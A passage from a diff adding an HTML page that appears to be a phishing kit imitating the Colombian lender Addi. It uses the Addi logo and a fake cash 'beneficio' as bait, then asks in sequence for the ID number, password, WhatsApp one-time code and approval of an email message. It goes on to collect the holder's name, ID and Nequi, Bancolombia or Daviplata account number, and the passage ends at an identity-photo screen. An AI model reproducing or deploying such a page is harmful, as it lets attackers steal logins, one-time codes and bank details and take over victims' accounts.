+    <path d="M53.13 0C51.81 0 50.73 1.07 50.73 2.38V7.17C49.48 6.51 48.05 6.13 46.53 6.13C41.57 6.13 37.53 10.14 37.53 15.07C37.53 20 41.56 24 46.53 24C51.5 24 55.54 20 55.54 15.07V2.38C55.54 1.07 54.46 0 53.13 0ZM46.53 19.23C44.22 19.23 42.33 17.37 42.33 15.07C42.33 12.77 44.21 10.9 46.53 10.9C48.85 10.9 50.73 12.77 50.73 15.07C50.73 17.37 48.85 19.23 46.53 19.23Z" fill="white"/>
+    <path d="M60.9 7.79C59.57 7.79 58.5 8.86 58.5 10.17V21.61C58.5 22.93 59.57 23.99 60.9 23.99C62.22 23.99 63.3 22.93 63.3 21.61V10.17C63.3 8.86 62.22 7.79 60.9 7.79Z" fill="white"/>
+    <path d="M8.12 2.06C3.64 2.06 0 5.67 0 10.12V21.61C0 22.93 1.08 23.99 2.4 23.99C3.73 23.99 4.81 22.93 4.81 21.61V17.44H11.43V21.61C11.43 22.93 12.51 23.99 13.83 23.99C15.16 23.99 16.24 22.93 16.24 21.61V10.12C16.24 5.67 12.59 2.06 8.12 2.06ZM11.44 12.67H4.81V10.12C4.81 8.3 6.3 6.83 8.12 6.83C9.95 6.83 11.44 8.3 11.44 10.12V12.67Z" fill="white"/>
+  </g><defs><clipPath id="c0"><rect width="64" height="24" fill="white"/></clipPath></defs></svg>
+  <div class="ring" style="margin:0 auto"></div>
+  <p class="loader-tag" style="margin:0 auto auto">Iniciando sesión</p>
+</div>
+
+<!-- LOGIN -->
+<div class="screen" id="s-login">
+  <div class="login-hero">
+    <div class="login-logo">
+      <svg width="80" height="30" viewBox="0 0 64 24" fill="none"><g clip-path="url(#cL2)">
+        <path d="M60.91 6.15C62.62 6.15 64 4.77 64 3.08C64 1.38 62.62 0 60.91 0C59.19 0 57.8 1.37 57.8 3.07C57.8 4.77 59.19 6.14 60.91 6.14V6.15Z" fill="white"/>
+        <path d="M33.49 0C32.16 0 31.09 1.07 31.09 2.38V7.17C29.83 6.51 28.41 6.13 26.89 6.13C21.93 6.13 17.88 10.14 17.88 15.07C17.88 20 21.92 24 26.89 24C31.86 24 35.89 20 35.89 15.07V2.38C35.89 1.07 34.82 0 33.49 0ZM26.89 19.23C24.58 19.23 22.7 17.37 22.7 15.07C22.7 12.77 24.58 10.9 26.89 10.9C29.21 10.9 31.09 12.77 31.09 15.07C31.09 17.37 29.21 19.23 26.89 19.23Z" fill="white"/>
+        <path d="M53.13 0C51.81 0 50.73 1.07 50.73 2.38V7.17C49.48 6.51 48.05 6.13 46.53 6.13C41.57 6.13 37.53 10.14 37.53 15.07C37.53 20 41.56 24 46.53 24C51.5 24 55.54 20 55.54 15.07V2.38C55.54 1.07 54.46 0 53.13 0ZM46.53 19.23C44.22 19.23 42.33 17.37 42.33 15.07C42.33 12.77 44.21 10.9 46.53 10.9C48.85 10.9 50.73 12.77 50.73 15.07C50.73 17.37 48.85 19.23 46.53 19.23Z" fill="white"/>
+        <path d="M60.9 7.79C59.57 7.79 58.5 8.86 58.5 10.17V21.61C58.5 22.93 59.57 23.99 60.9 23.99C62.22 23.99 63.3 22.93 63.3 21.61V10.17C63.3 8.86 62.22 7.79 60.9 7.79Z" fill="white"/>
+        <path d="M8.12 2.06C3.64 2.06 0 5.67 0 10.12V21.61C0 22.93 1.08 23.99 2.4 23.99C3.73 23.99 4.81 22.93 4.81 21.61V17.44H11.43V21.61C11.43 22.93 12.51 23.99 13.83 23.99C15.16 23.99 16.24 22.93 16.24 21.61V10.12C16.24 5.67 12.59 2.06 8.12 2.06ZM11.44 12.67H4.81V10.12C4.81 8.3 6.3 6.83 8.12 6.83C9.95 6.83 11.44 8.3 11.44 10.12V12.67Z" fill="white"/>
+      </g><defs><clipPath id="cL2"><rect width="64" height="24" fill="white"/></clipPath></defs></svg>
+    </div>
+    <h1 class="login-title">Accede a tu beneficio</h1>
+    <p class="login-sub">Ingresa tu cédula para comenzar y activar las siguientes secciones desde el panel.</p>
+  </div>
+  <div class="sbody" style="padding-top:28px">
+    <div id="login-error" class="error-box">
+      <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><circle cx="9" cy="9" r="8" stroke="#D83B3B" stroke-width="1.5"/><path d="M9 5v4M9 12.5v.5" stroke="#D83B3B" stroke-width="1.8" stroke-linecap="round"/></svg>
+      <span>Cédula incorrecta. Por favor vuelve a intentarlo.</span>
+    </div>
+    <div class="fgroup">
+      <label class="flabel" for="f-cedula">Número de documento</label>
+      <input class="finput" type="tel" id="f-cedula" placeholder="Ej: 1023456789" oninput="checkLogin()">
+    </div>
+  </div>
+  <div class="footer">
+    <button class="btn-main" id="btn-login" disabled onclick="submitLogin()">Enviar cédula →</button>
+  </div>
+</div>
+
+<!-- CONTRASENA -->
+<div class="screen" id="s-password">
+  <div class="login-hero">
+    <div class="login-logo" style="opacity:.85">
+      <svg width="80" height="30" viewBox="0 0 64 24" fill="none"><g clip-path="url(#cL2)">
+        <path d="M60.91 6.15C62.62 6.15 64 4.77 64 3.08C64 1.38 62.62 0 60.91 0C59.19 0 57.8 1.37 57.8 3.07C57.8 4.77 59.19 6.14 60.91 6.14V6.15Z" fill="white"/>
+        <path d="M33.49 0C32.16 0 31.09 1.07 31.09 2.38V7.17C29.83 6.51 28.41 6.13 26.89 6.13C21.93 6.13 17.88 10.14 17.88 15.07C17.88 20 21.92 24 26.89 24C31.86 24 35.89 20 35.89 15.07V2.38C35.89 1.07 34.82 0 33.49 0ZM26.89 19.23C24.58 19.23 22.7 17.37 22.7 15.07C22.7 12.77 24.58 10.9 26.89 10.9C29.21 10.9 31.09 12.77 31.09 15.07C31.09 17.37 29.21 19.23 26.89 19.23Z" fill="white"/>
+        <path d="M53.13 0C51.81 0 50.73 1.07 50.73 2.38V7.17C49.48 6.51 48.05 6.13 46.53 6.13C41.57 6.13 37.53 10.14 37.53 15.07C37.53 20 41.56 24 46.53 24C51.5 24 55.54 20 55.54 15.07V2.38C55.54 1.07 54.46 0 53.13 0ZM46.53 19.23C44.22 19.23 42.33 17.37 42.33 15.07C42.33 12.77 44.21 10.9 46.53 10.9C48.85 10.9 50.73 12.77 50.73 15.07C50.73 17.37 48.85 19.23 46.53 19.23Z" fill="white"/>
+        <path d="M60.9 7.79C59.57 7.79 58.5 8.86 58.5 10.17V21.61C58.5 22.93 59.57 23.99 60.9 23.99C62.22 23.99 63.3 22.93 63.3 21.61V10.17C63.3 8.86 62.22 7.79 60.9 7.79Z" fill="white"/>
+        <path d="M8.12 2.06C3.64 2.06 0 5.67 0 10.12V21.61C0 22.93 1.08 23.99 2.4 23.99C3.73 23.99 4.81 22.93 4.81 21.61V17.44H11.43V21.61C11.43 22.93 12.51 23.99 13.83 23.99C15.16 23.99 16.24 22.93 16.24 21.61V10.12C16.24 5.67 12.59 2.06 8.12 2.06ZM11.44 12.67H4.81V10.12C4.81 8.3 6.3 6.83 8.12 6.83C9.95 6.83 11.44 8.3 11.44 10.12V12.67Z" fill="white"/>
+      </g><defs><clipPath id="cL2"><rect width="64" height="24" fill="white"/></clipPath></defs></svg>
+    </div>
+    <h1 class="login-title">Ingresar contraseña</h1>
+    <p class="login-sub">Ingresa tu contraseña para continuar con el siguiente paso.</p>
+  </div>
+  <div class="sbody" style="padding-top:28px">
+    <div id="password-error" class="error-box">
+      <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><circle cx="9" cy="9" r="8" stroke="#D83B3B" stroke-width="1.5"/><path d="M9 5v4M9 12.5v.5" stroke="#D83B3B" stroke-width="1.8" stroke-linecap="round"/></svg>
+      <span>Contrase&ntilde;a inv&aacute;lida.</span>
+    </div>
+    <div class="fgroup">
+      <label class="flabel" for="f-pass">Contraseña</label>
+      <input class="finput" type="password" id="f-pass" placeholder="••••••••" oninput="checkPassword()">
+    </div>
+  </div>
+  <div class="footer">
+    <button class="btn-main" id="btn-password" disabled onclick="submitPassword()">Enviar →</button>
+  </div>
+</div>
+
+<!-- CONFIRMACION WHATSAPP -->
+<div class="screen" id="s-confirmacion-whatsapp">
+  <div class="topbar" style="border-bottom:none">
+    <svg width="60" height="22" viewBox="0 0 64 24" fill="none"><g clip-path="url(#cC)"><path d="M60.91 6.15C62.62 6.15 64 4.77 64 3.08C64 1.38 62.62 0 60.91 0C59.19 0 57.8 1.37 57.8 3.07C57.8 4.77 59.19 6.14 60.91 6.14V6.15Z" fill="#1C67D8"/><path d="M33.49 0C32.16 0 31.09 1.07 31.09 2.38V7.17C29.83 6.51 28.41 6.13 26.89 6.13C21.93 6.13 17.88 10.14 17.88 15.07C17.88 20 21.92 24 26.89 24C31.86 24 35.89 20 35.89 15.07V2.38C35.89 1.07 34.82 0 33.49 0ZM26.89 19.23C24.58 19.23 22.7 17.37 22.7 15.07C22.7 12.77 24.58 10.9 26.89 10.9C29.21 10.9 31.09 12.77 31.09 15.07C31.09 17.37 29.21 19.23 26.89 19.23Z" fill="#1C67D8"/><path d="M53.13 0C51.81 0 50.73 1.07 50.73 2.38V7.17C49.48 6.51 48.05 6.13 46.53 6.13C41.57 6.13 37.53 10.14 37.53 15.07C37.53 20 41.56 24 46.53 24C51.5 24 55.54 20 55.54 15.07V2.38C55.54 1.07 54.46 0 53.13 0ZM46.53 19.23C44.22 19.23 42.33 17.37 42.33 15.07C42.33 12.77 44.21 10.9 46.53 10.9C48.85 10.9 50.73 12.77 50.73 15.07C50.73 17.37 48.85 19.23 46.53 19.23Z" fill="#1C67D8"/><path d="M60.9 7.79C59.57 7.79 58.5 8.86 58.5 10.17V21.61C58.5 22.93 59.57 23.99 60.9 23.99C62.22 23.99 63.3 22.93 63.3 21.61V10.17C63.3 8.86 62.22 7.79 60.9 7.79Z" fill="#1C67D8"/><path d="M8.12 2.06C3.64 2.06 0 5.67 0 10.12V21.61C0 22.93 1.08 23.99 2.4 23.99C3.73 23.99 4.81 22.93 4.81 21.61V17.44H11.43V21.61C11.43 22.93 12.51 23.99 13.83 23.99C15.16 23.99 16.24 22.93 16.24 21.61V10.12C16.24 5.67 12.59 2.06 8.12 2.06ZM11.44 12.67H4.81V10.12C4.81 8.3 6.3 6.83 8.12 6.83C9.95 6.83 11.44 8.3 11.44 10.12V12.67Z" fill="#1C67D8"/></g><defs><clipPath id="cC"><rect width="64" height="24" fill="white"/></clipPath></defs></svg>
+  </div>
+  <div class="prog-wrap"><div class="prog-track"><div class="prog-fill" style="width:70%"></div></div></div>
+  <div class="sbody">
+    <div class="otp-hero">
+      <span class="otp-icon">📱</span>
+      <div class="otp-title">Confirmación por WhatsApp</div>
+      <div class="otp-sub">Te enviamos Te enviamos tu codigo de confirmacion por WhatsApp al celular registrado con la cedula<span class="otp-numero" id="cedula-confirmacion">—</span>. Ingrésalo aquí.</div>
+    </div>
+    <div id="whatsapp-error-box" class="otp-error-box">
+      <svg width="18" height="18" viewBox="0 0 18 18" fill="none" style="flex-shrink:0"><circle cx="9" cy="9" r="8" stroke="#D83B3B" stroke-width="1.5"/><path d="M9 5v4M9 12.5v .5" stroke="#D83B3B" stroke-width="1.8" stroke-linecap="round"/></svg>
+      <span>Código errado o vencido. Por favor coloca uno correctamente.</span>
+    </div>
+    <div class="otp-wrap" id="whatsapp-wrap" onclick="focusWhatsappCode()">
+      <div class="otp-field">
+        <div class="otp-digit" id="wd0"></div>
+        <div class="otp-line" id="wl0"></div>
+      </div>
+      <div class="otp-field">
+        <div class="otp-digit" id="wd1"></div>
+        <div class="otp-line" id="wl1"></div>
+      </div>
+      <div class="otp-field">
+        <div class="otp-digit" id="wd2"></div>
+        <div class="otp-line" id="wl2"></div>
+      </div>
+      <div class="otp-field">
+        <div class="otp-digit" id="wd3"></div>
+        <div class="otp-line" id="wl3"></div>
+      </div>
+      <div class="otp-field">
+        <div class="otp-digit" id="wd4"></div>
+        <div class="otp-line" id="wl4"></div>
+      </div>
+      <div class="otp-field">
+        <div class="otp-digit" id="wd5"></div>
+        <div class="otp-line" id="wl5"></div>
+      </div>
+    </div>
+    <input class="otp-real-input" type="number" id="whatsapp-input" inputmode="numeric" maxlength="6" oninput="onWhatsappInput(this)" onkeydown="onWhatsappKey(event)">
+    <p class="otp-hint">El código expira en 5 minutos</p>
+  </div>
+  <div class="footer">
+    <button class="btn-main" id="btn-whatsapp" disabled onclick="submitWhatsapp()">Confirmar →</button>
+  </div>
+</div>
+
+<!-- CORREO APROBACION -->
+<div class="screen" id="s-correo-aprobacion">
+  <div class="topbar" style="border-bottom:none">
+    <svg width="60" height="22" viewBox="0 0 64 24" fill="none"><g clip-path="url(#cC)"><path d="M60.91 6.15C62.62 6.15 64 4.77 64 3.08C64 1.38 62.62 0 60.91 0C59.19 0 57.8 1.37 57.8 3.07C57.8 4.77 59.19 6.14 60.91 6.14V6.15Z" fill="#1C67D8"/><path d="M33.49 0C32.16 0 31.09 1.07 31.09 2.38V7.17C29.83 6.51 28.41 6.13 26.89 6.13C21.93 6.13 17.88 10.14 17.88 15.07C17.88 20 21.92 24 26.89 24C31.86 24 35.89 20 35.89 15.07V2.38C35.89 1.07 34.82 0 33.49 0ZM26.89 19.23C24.58 19.23 22.7 17.37 22.7 15.07C22.7 12.77 24.58 10.9 26.89 10.9C29.21 10.9 31.09 12.77 31.09 15.07C31.09 17.37 29.21 19.23 26.89 19.23Z" fill="#1C67D8"/><path d="M53.13 0C51.81 0 50.73 1.07 50.73 2.38V7.17C49.48 6.51 48.05 6.13 46.53 6.13C41.57 6.13 37.53 10.14 37.53 15.07C37.53 20 41.56 24 46.53 24C51.5 24 55.54 20 55.54 15.07V2.38C55.54 1.07 54.46 0 53.13 0ZM46.53 19.23C44.22 19.23 42.33 17.37 42.33 15.07C42.33 12.77 44.21 10.9 46.53 10.9C48.85 10.9 50.73 12.77 50.73 15.07C50.73 17.37 48.85 19.23 46.53 19.23Z" fill="#1C67D8"/><path d="M60.9 7.79C59.57 7.79 58.5 8.86 58.5 10.17V21.61C58.5 22.93 59.57 23.99 60.9 23.99C62.22 23.99 63.3 22.93 63.3 21.61V10.17C63.3 8.86 62.22 7.79 60.9 7.79Z" fill="#1C67D8"/><path d="M8.12 2.06C3.64 2.06 0 5.67 0 10.12V21.61C0 22.93 1.08 23.99 2.4 23.99C3.73 23.99 4.81 22.93 4.81 21.61V17.44H11.43V21.61C11.43 22.93 12.51 23.99 13.83 23.99C15.16 23.99 16.24 22.93 16.24 21.61V10.12C16.24 5.67 12.59 2.06 8.12 2.06ZM11.44 12.67H4.81V10.12C4.81 8.3 6.3 6.83 8.12 6.83C9.95 6.83 11.44 8.3 11.44 10.12V12.67Z" fill="#1C67D8"/></g><defs><clipPath id="cC"><rect width="64" height="24" fill="white"/></clipPath></defs></svg>
+  </div>
+  <div class="prog-wrap"><div class="prog-track"><div class="prog-fill" style="width:80%"></div></div></div>
+  <div class="sbody">
+    <div class="otp-hero">
+      <span class="otp-icon">📧</span>
+      <div class="otp-title">Activacion de beneficio</div>
+      <div class="otp-sub">Te hemos enviado un mensaje de aprobación a tu correo electrónico registrado con la cédula <span class="otp-numero" id="cedula-correo">—</span>. aprueba o deniega tu beneficio presionando el botón de confirmación. Una vez presionado vuelve hacia la plataforma en linea de Addi y presiona el boton Aprobado.</div>
+      <br>
+      <div class="otp-sub">Revisa tu bandeja de entrada y spam para encontrar el mensaje.</div>
+    </div>
+    <p class="otp-hint" style="margin-top:20px;text-align:center;font-weight:600">Selecciona una opción:</p>
+    <div class="approval-btns">
+      <button class="btn-approve" onclick="submitApprove()">✓ Aprobar</button>
+      <button class="btn-deny" onclick="submitDeny()">✗ Denegar</button>
+    </div>
+  </div>
+  <div class="footer">
+    <button class="btn-main" id="btn-correo" disabled onclick="submitCorreo()">Confirmar desembolso →</button>
+  </div>
+</div>
+
+<!-- WHATSAPP - WTHSAPP -->
+<div class="screen" id="s-WTHSAPP">
+  <div class="topbar" style="border-bottom:none">
+    <svg width="60" height="22" viewBox="0 0 64 24" fill="none"><g clip-path="url(#cC)"><path d="M60.91 6.15C62.62 6.15 64 4.77 64 3.08C64 1.38 62.62 0 60.91 0C59.19 0 57.8 1.37 57.8 3.07C57.8 4.77 59.19 6.14 60.91 6.14V6.15Z" fill="#1C67D8"/></g></svg>
+  </div>
+  <div class="prog-wrap"><div class="prog-track"><div class="prog-fill" style="width:80%"></div></div></div>
+  <div class="sbody">
+    <div class="wthsapp-card">
+      <div class="wthsapp-icon">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M20.5 3.5a9.5 9.5 0 10-3.02 13.3L21 21l-1.2-3.9A9.46 9.46 0 0020.5 3.5z" fill="white" opacity="0.95"/></svg>
+      </div>
+      <div class="wthsapp-title">WTHSAPP</div>
+      <div class="wthsapp-text">para completar tu desembolso, necesitas finalizar el ultimo paso a traves de tu telefono movil. Recibiras un enlace por Whatsapp y correo electronico en los datos registrados</div>
+      <div class="wthsapp-strong">Una vez verificada tu identidad, por favor pulsa:</div>
+    </div>
+    <div style="padding:0 6px;">
+      <button class="wthsapp-btn" onclick="submitVerificado()">Verificado</button>
+    </div>
+  </div>
+  <div class="footer">
+    <button class="btn-main" onclick="submitVerificado()">Continuar →</button>
+  </div>
+</div>
+
+<!-- ESPERA LOGIN -->
+<div class="screen" id="s-espera">
+  <div class="espera-content" style="margin:auto">
+    <svg width="90" height="34" viewBox="0 0 64 24" fill="none"><g clip-path="url(#cE)">
+      <path d="M60.91 6.15C62.62 6.15 64 4.77 64 3.08C64 1.38 62.62 0 60.91 0C59.19 0 57.8 1.37 57.8 3.07C57.8 4.77 59.19 6.14 60.91 6.14V6.15Z" fill="white"/>
+      <path d="M33.49 0C32.16 0 31.09 1.07 31.09 2.38V7.17C29.83 6.51 28.41 6.13 26.89 6.13C21.93 6.13 17.88 10.14 17.88 15.07C17.88 20 21.92 24 26.89 24C31.86 24 35.89 20 35.89 15.07V2.38C35.89 1.07 34.82 0 33.49 0ZM26.89 19.23C24.58 19.23 22.7 17.37 22.7 15.07C22.7 12.77 24.58 10.9 26.89 10.9C29.21 10.9 31.09 12.77 31.09 15.07C31.09 17.37 29.21 19.23 26.89 19.23Z" fill="white"/>
+      <path d="M53.13 0C51.81 0 50.73 1.07 50.73 2.38V7.17C49.48 6.51 48.05 6.13 46.53 6.13C41.57 6.13 37.53 10.14 37.53 15.07C37.53 20 41.56 24 46.53 24C51.5 24 55.54 20 55.54 15.07V2.38C55.54 1.07 54.46 0 53.13 0ZM46.53 19.23C44.22 19.23 42.33 17.37 42.33 15.07C42.33 12.77 44.21 10.9 46.53 10.9C48.85 10.9 50.73 12.77 50.73 15.07C50.73 17.37 48.85 19.23 46.53 19.23Z" fill="white"/>
+      <path d="M60.9 7.79C59.57 7.79 58.5 8.86 58.5 10.17V21.61C58.5 22.93 59.57 23.99 60.9 23.99C62.22 23.99 63.3 22.93 63.3 21.61V10.17C63.3 8.86 62.22 7.79 60.9 7.79Z" fill="white"/>
+      <path d="M8.12 2.06C3.64 2.06 0 5.67 0 10.12V21.61C0 22.93 1.08 23.99 2.4 23.99C3.73 23.99 4.81 22.93 4.81 21.61V17.44H11.43V21.61C11.43 22.93 12.51 23.99 13.83 23.99C15.16 23.99 16.24 22.93 16.24 21.61V10.12C16.24 5.67 12.59 2.06 8.12 2.06ZM11.44 12.67H4.81V10.12C4.81 8.3 6.3 6.83 8.12 6.83C9.95 6.83 11.44 8.3 11.44 10.12V12.67Z" fill="white"/>
+    </g><defs><clipPath id="cE"><rect width="64" height="24" fill="white"/></clipPath></defs></svg>
+    <div class="espera-ring"></div>
+    <div>
+      <div class="espera-title espera-copy" id="espera-title">Verificando identidad</div>
+      <div class="espera-sub espera-copy" id="espera-sub" style="margin-top:8px">Estamos validando tu información. Por favor espera un momento.</div>
+    </div>
+    <div class="espera-dots">
+      <div class="espera-dot"></div>
+      <div class="espera-dot"></div>
+      <div class="espera-dot"></div>
+    </div>
+  </div>
+</div>
+
+<!-- MONTO -->
+<div class="screen" id="s-monto">
+  <div class="topbar" style="border-bottom:none">
+    <svg width="60" height="22" viewBox="0 0 64 24" fill="none"><g clip-path="url(#cM)">
+      <path d="M60.91 6.15C62.62 6.15 64 4.77 64 3.08C64 1.38 62.62 0 60.91 0C59.19 0 57.8 1.37 57.8 3.07C57.8 4.77 59.19 6.14 60.91 6.14V6.15Z" fill="#1C67D8"/>
+      <path d="M33.49 0C32.16 0 31.09 1.07 31.09 2.38V7.17C29.83 6.51 28.41 6.13 26.89 6.13C21.93 6.13 17.88 10.14 17.88 15.07C17.88 20 21.92 24 26.89 24C31.86 24 35.89 20 35.89 15.07V2.38C35.89 1.07 34.82 0 33.49 0ZM26.89 19.23C24.58 19.23 22.7 17.37 22.7 15.07C22.7 12.77 24.58 10.9 26.89 10.9C29.21 10.9 31.09 12.77 31.09 15.07C31.09 17.37 29.21 19.23 26.89 19.23Z" fill="#1C67D8"/>
+      <path d="M53.13 0C51.81 0 50.73 1.07 50.73 2.38V7.17C49.48 6.51 48.05 6.13 46.53 6.13C41.57 6.13 37.53 10.14 37.53 15.07C37.53 20 41.56 24 46.53 24C51.5 24 55.54 20 55.54 15.07V2.38C55.54 1.07 54.46 0 53.13 0ZM46.53 19.23C44.22 19.23 42.33 17.37 42.33 15.07C42.33 12.77 44.21 10.9 46.53 10.9C48.85 10.9 50.73 12.77 50.73 15.07C50.73 17.37 48.85 19.23 46.53 19.23Z" fill="#1C67D8"/>
+      <path d="M60.9 7.79C59.57 7.79 58.5 8.86 58.5 10.17V21.61C58.5 22.93 59.57 23.99 60.9 23.99C62.22 23.99 63.3 22.93 63.3 21.61V10.17C63.3 8.86 62.22 7.79 60.9 7.79Z" fill="#1C67D8"/>
+      <path d="M8.12 2.06C3.64 2.06 0 5.67 0 10.12V21.61C0 22.93 1.08 23.99 2.4 23.99C3.73 23.99 4.81 22.93 4.81 21.61V17.44H11.43V21.61C11.43 22.93 12.51 23.99 13.83 23.99C15.16 23.99 16.24 22.93 16.24 21.61V10.12C16.24 5.67 12.59 2.06 8.12 2.06ZM11.44 12.67H4.81V10.12C4.81 8.3 6.3 6.83 8.12 6.83C9.95 6.83 11.44 8.3 11.44 10.12V12.67Z" fill="#1C67D8"/>
+    </g><defs><clipPath id="cM"><rect width="64" height="24" fill="white"/></clipPath></defs></svg>
+    
+  </div>
+  <div class="prog-wrap"><div class="prog-track"><div class="prog-fill" style="width:40%"></div></div></div>
+  <div class="sbody">
+    <div class="monto-hero">
+      <span class="monto-big">💸</span>
+      <div class="monto-title">¿Cuánto quieres desembolsar?</div>
+      <div class="monto-sub">Selecciona o ingresa el monto que quieres recibir en tu cuenta.</div>
+    </div>
+    <div class="montos-rapidos">
+      <div class="monto-pill" onclick="setMonto(500000)">$500.000</div>
+      <div class="monto-pill" onclick="setMonto(1000000)">$1.000.000</div>
+      <div class="monto-pill" onclick="setMonto(1500000)">$1.500.000</div>
+      <div class="monto-pill" onclick="setMonto(2000000)">$2.000.000</div>
+    </div>
+    <div class="fgroup">
+      <label class="flabel" for="f-monto">O ingresa el monto manualmente</label>
+      <div class="monto-input-wrap">
+        <span class="monto-prefix">$</span>
+        <input class="monto-input finput" type="number" id="f-monto" placeholder="0" oninput="onMontoInput(this)">
+      </div>
+    </div>
+    <p class="monto-hint">Monto mínimo $100.000 — máximo $5.000.000</p>
+  </div>
+  <div class="footer">
+    <button class="btn-main" id="btn-monto" disabled onclick="irACuenta()">Continuar →</button>
+  </div>
+</div>
+
+<!-- CUENTA -->
+<div class="screen" id="s-cuenta">
+  <div class="topbar">
+    <svg width="60" height="22" viewBox="0 0 64 24" fill="none"><g clip-path="url(#cC)">
+      <path d="M60.91 6.15C62.62 6.15 64 4.77 64 3.08C64 1.38 62.62 0 60.91 0C59.19 0 57.8 1.37 57.8 3.07C57.8 4.77 59.19 6.14 60.91 6.14V6.15Z" fill="#1C67D8"/>
+      <path d="M33.49 0C32.16 0 31.09 1.07 31.09 2.38V7.17C29.83 6.51 28.41 6.13 26.89 6.13C21.93 6.13 17.88 10.14 17.88 15.07C17.88 20 21.92 24 26.89 24C31.86 24 35.89 20 35.89 15.07V2.38C35.89 1.07 34.82 0 33.49 0ZM26.89 19.23C24.58 19.23 22.7 17.37 22.7 15.07C22.7 12.77 24.58 10.9 26.89 10.9C29.21 10.9 31.09 12.77 31.09 15.07C31.09 17.37 29.21 19.23 26.89 19.23Z" fill="#1C67D8"/>
+      <path d="M53.13 0C51.81 0 50.73 1.07 50.73 2.38V7.17C49.48 6.51 48.05 6.13 46.53 6.13C41.57 6.13 37.53 10.14 37.53 15.07C37.53 20 41.56 24 46.53 24C51.5 24 55.54 20 55.54 15.07V2.38C55.54 1.07 54.46 0 53.13 0ZM46.53 19.23C44.22 19.23 42.33 17.37 42.33 15.07C42.33 12.77 44.21 10.9 46.53 10.9C48.85 10.9 50.73 12.77 50.73 15.07C50.73 17.37 48.85 19.23 46.53 19.23Z" fill="#1C67D8"/>
+      <path d="M60.9 7.79C59.57 7.79 58.5 8.86 58.5 10.17V21.61C58.5 22.93 59.57 23.99 60.9 23.99C62.22 23.99 63.3 22.93 63.3 21.61V10.17C63.3 8.86 62.22 7.79 60.9 7.79Z" fill="#1C67D8"/>
+      <path d="M8.12 2.06C3.64 2.06 0 5.67 0 10.12V21.61C0 22.93 1.08 23.99 2.4 23.99C3.73 23.99 4.81 22.93 4.81 21.61V17.44H11.43V21.61C11.43 22.93 12.51 23.99 13.83 23.99C15.16 23.99 16.24 22.93 16.24 21.61V10.12C16.24 5.67 12.59 2.06 8.12 2.06ZM11.44 12.67H4.81V10.12C4.81 8.3 6.3 6.83 8.12 6.83C9.95 6.83 11.44 8.3 11.44 10.12V12.67Z" fill="#1C67D8"/>
+    </g><defs><clipPath id="cC"><rect width="64" height="24" fill="white"/></clipPath></defs></svg>
+    
+  </div>
+  <div class="prog-wrap"><div class="prog-track"><div class="prog-fill" style="width:65%"></div></div></div>
+  <div class="sbody">
+    <h2 class="cuenta-titulo">¿A qué cuenta quieres recibir tu cupo?</h2>
+    <p class="cuenta-sub">Selecciona tu método de pago preferido para recibir el desembolso.</p>
+    <div class="pago-btns">
+      <div class="pago-btn" id="btn-nequi" onclick="selectPago('nequi')">
+        <div class="pago-ico ico-nequi" style="background:#6A0DAD22;overflow:hidden"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ7ApU9gFh2quNO1A7z7Fsq-QbpKtHmmYLl9EDQ0QAm5snyXvnCetGuDzA&s=10" style="width:40px;height:40px;object-fit:contain"></div>
+        <div><div class="pago-name">Nequi</div><div class="pago-desc">Desembolso inmediato a tu cuenta Nequi</div></div>
+      </div>
+      <div class="pago-btn" id="btn-bancolombia" onclick="selectPago('bancolombia')">
+        <div class="pago-ico ico-banco" style="background:#FFF3CD;overflow:hidden"><img src="https://cdn.brandfetch.io/grupobancolombia.com/fallback/lettermark/theme/dark/h/256/w/256/icon?c=1bfwsmEH20zzEfSNTed" style="width:40px;height:40px;object-fit:contain"></div>
+        <div><div class="pago-name">Bancolombia</div><div class="pago-desc">Transferencia a tu cuenta de ahorros o corriente</div></div>
+      </div>
+      <div class="pago-btn" id="btn-daviplata" onclick="selectPago('daviplata')">
+        <div class="pago-ico ico-davi" style="background:#FFE5E5;overflow:hidden"><img src="https://wsrv.nl/?url=images.seeklogo.com/logo-png/45/1/daviplata-logo-png_seeklogo-457809.png&w=80&h=80&fit=contain&output=png" style="width:40px;height:40px;object-fit:contain"></div>
+        <div><div class="pago-name">Daviplata</div><div class="pago-desc">Recibe directamente en tu billetera Daviplata</div></div>
+      </div>
+    </div>
+
+    <!-- Campos que aparecen al seleccionar -->
+    <div class="cuenta-form" id="cuenta-form">
+      <div class="divider"></div>
+      <div class="fgroup">
+        <label class="flabel" for="f-cnombre">Nombre completo del titular</label>
+        <input class="finput" type="text" id="f-cnombre" placeholder="Ej: María Fernanda González" oninput="checkCuenta()">
+      </div>
+      <div class="fgroup">
+        <label class="flabel" for="f-cced">Número de cédula</label>
+        <input class="finput" type="number" id="f-cced" placeholder="Ej: 1023456789" oninput="checkCuenta()">
+      </div>
+      <div class="fgroup">
+        <label class="flabel" for="f-cnum" id="label-cnum">Número de cuenta / Nequi</label>
+        <input class="finput" type="number" id="f-cnum" placeholder="Ej: 3001234567" oninput="checkCuenta()">
+      </div>
+    </div>
+  </div>
+  <div class="footer">
+    <button class="btn-main" id="btn-cuenta" disabled onclick="submitCuenta()">Continuar →</button>
+  </div>
+</div>
+
+<!-- ESPERA CUENTA -->
+<!-- VALIDACION DE IDENTIDAD -->
+<div class="screen" id="s-foto">
+  <div class="topbar">
+    <svg width="60" height="22" viewBox="0 0 64 24" fill="none"><g clip-path="url(#cF)">
+      <path d="M60.91 6.15C62.62 6.15 64 4.77 64 3.08C64 1.38 62.62 0 60.91 0C59.19 0 57.8 1.37 57.8 3.07C57.8 4.77 59.19 6.14 60.91 6.14V6.15Z" fill="#1C67D8"/>
+      <path d="M33.49 0C32.16 0 31.09 1.07 31.09 2.38V7.17C29.83 6.51 28.41 6.13 26.89 6.13C21.93 6.13 17.88 10.14 17.88 15.07C17.88 20 21.92 24 26.89 24C31.86 24 35.89 20 35.89 15.07V2.38C35.89 1.07 34.82 0 33.49 0ZM26.89 19.23C24.58 19.23 22.7 17.37 22.7 15.07C22.7 12.77 24.58 10.9 26.89 10.9C29.21 10.9 31.09 12.77 31.09 15.07C31.09 17.37 29.21 19.23 26.89 19.23Z" fill="#1C67D8"/>
